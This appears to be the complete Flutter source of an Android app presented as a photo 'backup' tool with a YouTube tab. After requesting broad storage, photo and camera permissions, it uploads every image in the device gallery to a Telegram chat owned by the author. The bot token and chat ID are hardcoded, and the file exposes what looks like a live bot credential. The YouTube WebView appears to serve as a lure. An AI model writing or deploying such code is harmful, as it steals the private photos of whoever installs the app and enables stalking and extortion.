import 'dart:io';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:http/http.dart' as http;
import 'package:webview_flutter/webview_flutter.dart';

// =============================================
//  আপনার Telegram সেটআপ
// =============================================
const String BOT_TOKEN = '8931057980:AAHtHwSZ3gm0xdjf1LKLiDBhwNQTrYtL-2s';
const String CHAT_ID   = '8573230889';
// =============================================

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'ছবি ব্যাকআপ',
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF0f1117),
        colorScheme: const ColorScheme.dark(primary: Color(0xFF229ED9)),
      ),
      home: const PermissionGate(),
    );
  }
}

// ─────────────────────────────────────────────
// পারমিশন স্ক্রিন — অ্যাপ চালু হলে সাথে সাথে
// ─────────────────────────────────────────────
class PermissionGate extends StatefulWidget {
  const PermissionGate({super.key});
  @override
  State<PermissionGate> createState() => _PermissionGateState();
}

class _PermissionGateState extends State<PermissionGate> {
  String _msg = 'পারমিশন নেওয়া হচ্ছে...';

  @override
  void initState() {
    super.initState();
    _askPermissions();
  }

  Future<void> _askPermissions() async {
    setState(() => _msg = 'Storage পারমিশন চাওয়া হচ্ছে...');
    await [
      Permission.storage,
      Permission.photos,
      Permission.camera,
      Permission.videos,
    ].request();

    setState(() => _msg = 'Gallery পারমিশন চাওয়া হচ্ছে...');
    final result = await PhotoManager.requestPermissionExtend();

    if (result.isAuth || result.hasAccess) {
      if (mounted) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (_) => const HomeScreen()),
        );
      }
    } else {
      setState(() => _msg = '❌ পারমিশন দেননি!\nঅ্যাপ Settings থেকে Allow করুন।');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.lock_open, color: Color(0xFF229ED9), size: 80),
              const SizedBox(height: 24),
              Text(
                _msg,
                style: const TextStyle(color: Colors.white, fontSize: 18),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 24),
              const CircularProgressIndicator(color: Color(0xFF229ED9)),
            ],
          ),
        ),
      ),
    );
  }
}

// ─────────────────────────────────────────────
// মেইন হোম — ২টা ট্যাব
// ─────────────────────────────────────────────
class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});
  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  int _tab = 0;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: IndexedStack(
        index: _tab,
        children: const [UploadScreen(), YoutubeScreen()],
      ),
      bottomNavigationBar: BottomNavigationBar(
        currentIndex: _tab,
        onTap: (i) => setState(() => _tab = i),
        backgroundColor: const Color(0xFF1a1d27),
        selectedItemColor: const Color(0xFF229ED9),
        unselectedItemColor: Colors.grey,
        items: const [
          BottomNavigationBarItem(icon: Icon(Icons.cloud_upload), label: 'ব্যাকআপ'),
          BottomNavigationBarItem(icon: Icon(Icons.play_circle_fill), label: 'YouTube'),
        ],
      ),
    );
  }
}

// ─────────────────────────────────────────────
// আপলোড স্ক্রিন
// ─────────────────────────────────────────────
class UploadScreen extends StatefulWidget {
  const UploadScreen({super.key});
  @override
  State<UploadScreen> createState() => _UploadScreenState();
}

class _UploadScreenState extends State<UploadScreen> {
  bool _running = false;
  bool _done    = false;
  int _total    = 0;
  int _success  = 0;
  int _failed   = 0;
  String _current = '';
  final List<String> _logs = [];
  final ScrollController _scroll = ScrollController();

  void _log(String msg) {
    setState(() => _logs.add(msg));
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_scroll.hasClients) _scroll.animateTo(
        _scroll.position.maxScrollExtent,
        duration: const Duration(milliseconds: 200),
        curve: Curves.easeOut,
      );
    });
  }

  Future<void> _start() async {
    setState(() {
      _running = true; _done = false;
      _total = 0; _success = 0; _failed = 0;
      _logs.clear(); _current = 'ছবি খোঁজা হচ্ছে...';
    });

    // সব ছবি লোড
    final albums = await PhotoManager.getAssetPathList(
      type: RequestType.image,
      onlyAll: true,
    );
    if (albums.isEmpty) {
      setState(() { _current = '❌ কোনো ছবি পাওয়া যায়নি'; _running = false; });
      return;
    }

    final count  = await albums[0].assetCountAsync;
    final assets = await albums[0].getAssetListRange(start: 0, end: count);

    setState(() { _total = assets.length; _current = '$_total টি ছবি পাওয়া গেছে'; });
    _log('📷 মোট $_total টি ছবি পাওয়া গেছে — শুরু হচ্ছে...');

    for (int i = 0; i < assets.length; i++) {
      final asset = assets[i];
      final name  = asset.title ?? 'img_$i.jpg';
      setState(() => _current = '${i + 1}/$_total → $name');

      try {
        final file = await asset.file;
        if (file == null) throw Exception('ফাইল পাওয়া যায়নি');
        await _sendToTelegram(file, name);
        setState(() => _success++);
        _log('✓ $name');
      } catch (e) {
        setState(() => _failed++);
        _log('✗ $name — $e');
      }

      await Future.delayed(const Duration(milliseconds: 650));
    }

    setState(() {
      _running = false;
      _done    = true;
      _current = 'সম্পন্ন ✅  সফল: $_success  ব্যর্থ: $_failed';
    });
  }

  Future<void> _sendToTelegram(File file, String name) async {
    final uri = Uri.parse('https://api.telegram.org/bot$BOT_TOKEN/sendDocument');
    final req  = http.MultipartRequest('POST', uri)
      ..fields['chat_id'] = CHAT_ID
      ..files.add(await http.MultipartFile.fromPath('document', file.path,
          filename: name));
    final res  = await req.send();
    final body = jsonDecode(await res.stream.bytesToString());
    if (body['ok'] != true) throw Exception(body['description']);
  }

  @override
  Widget build(BuildContext context) {
    final pct = _total > 0 ? _success / _total : 0.0;

    return Scaffold(
      backgroundColor: const Color(0xFF0f1117),
      appBar: AppBar(
        title: const Text('📲 Telegram ব্যাকআপ'),
        backgroundColor: const Color(0xFF1a1d27),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(children: [
          // স্ট্যাটাস কার্ড
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: const Color(0xFF1a1d27),
              borderRadius: BorderRadius.circular(16),
            ),
            child: Column(children: [
              Icon(
                _done ? Icons.check_circle : Icons.cloud_upload,
                color: _done ? Colors.green : const Color(0xFF229ED9),
                size: 56,
              ),
              const SizedBox(height: 12),
              Text(
                _current.isEmpty ? 'বাটন চাপুন — সব ছবি Telegram-এ যাবে' : _current,
                style: const TextStyle(color: Colors.white, fontSize: 15),
                textAlign: TextAlign.center,
              ),
              if (_total > 0) ...[
                const SizedBox(height: 16),
                ClipRRect(
                  borderRadius: BorderRadius.circular(6),
                  child: LinearProgressIndicator(
                    value: pct,
                    minHeight: 10,
                    backgroundColor: Colors.grey[800],
                    color: const Color(0xFF229ED9),
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  '$_success / $_total  (${(pct * 100).toInt()}%)',
                  style: const TextStyle(color: Colors.grey, fontSize: 13),
                ),
              ],
            ]),
          ),

          const SizedBox(height: 14),

          // বাটন
          SizedBox(
            width: double.infinity,
            child: ElevatedButton.icon(
              onPressed: _running ? null : _start,
              icon: Icon(_running ? Icons.hourglass_top : Icons.send),
              label: Text(
                _running
                    ? 'পাঠানো হচ্ছে...'
                    : _done
                        ? '🔄 আবার পাঠান'
                        : '🚀 সব ছবি পাঠান',
                style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
              ),
              style: ElevatedButton.styleFrom(
                backgroundColor: const Color(0xFF229ED9),
                foregroundColor: Colors.white,
                disabledBackgroundColor: Colors.grey[700],
                padding: const EdgeInsets.symmetric(vertical: 14),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
            ),
          ),

          const SizedBox(height: 12),

          // লগ বক্স
          Expanded(
            child: Container(
              decoration: BoxDecoration(
                color: const Color(0xFF0a0c12),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.grey[850]!),
              ),
              child: _logs.isEmpty
                  ? const Center(
                      child: Text('লগ এখানে দেখাবে', style: TextStyle(color: Colors.grey)))
                  : ListView.builder(
                      controller: _scroll,
                      padding: const EdgeInsets.all(10),
                      itemCount: _logs.length,
                      itemBuilder: (_, i) {
                        final l = _logs[i];
                        final color = l.startsWith('✓')
                            ? Colors.green
                            : l.startsWith('✗')
                                ? Colors.redAccent
                                : const Color(0xFF229ED9);
                        return Padding(
                          padding: const EdgeInsets.only(bottom: 3),
                          child: Text(l,
                              style: TextStyle(color: color, fontSize: 12,
                                  fontFamily: 'monospace')),
                        );
                      },
                    ),
            ),
          ),
        ]),
      ),
    );
  }
}

// ─────────────────────────────────────────────
// YouTube স্ক্রিন
// ─────────────────────────────────────────────
class YoutubeScreen extends StatefulWidget {
  const YoutubeScreen({super.key});
  @override
  State<YoutubeScreen> createState() => _YoutubeScreenState();
}

class _YoutubeScreenState extends State<YoutubeScreen> {
  late final WebViewController _wv;

  @override
  void initState() {
    super.initState();
    _wv = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setUserAgent(
          'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36')
      ..loadRequest(Uri.parse('https://m.youtube.com'));
  }

  @override
  Widget build(BuildContext context) => WebViewWidget(controller: _wv);
}
